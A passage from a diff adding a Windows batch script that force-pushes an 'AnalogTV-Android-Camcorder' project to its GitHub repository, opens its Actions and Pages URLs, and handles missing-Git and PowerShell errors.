+git remote add origin https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder.git
+git push -u origin main --force
+
+echo.
+echo ============================================================================
+echo   [6/6] DEPLOYMENT AND UPDATE COMPLETE FOR @f1nal-b0ss!
+echo   1. Check APK build : https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/actions
+echo   2. Live Web App    : https://f1nal-b0ss.github.io/AnalogTV-Android-Camcorder/
+echo ============================================================================
+echo.
+start "" "https://github.com/f1nal-b0ss/AnalogTV-Android-Camcorder/actions"
+start "" "https://f1nal-b0ss.github.io/AnalogTV-Android-Camcorder/"
+pause
+exit /b 0
+
+:no_git
+echo [ERROR] Git is not installed or not in your PATH.
+echo         Download Git for Windows from: https://git-scm.com/download/win
+pause
+exit /b 1
+
+:ps_err
+echo [ERROR] PowerShell file preparation failed.
+pause
+exit /b 1
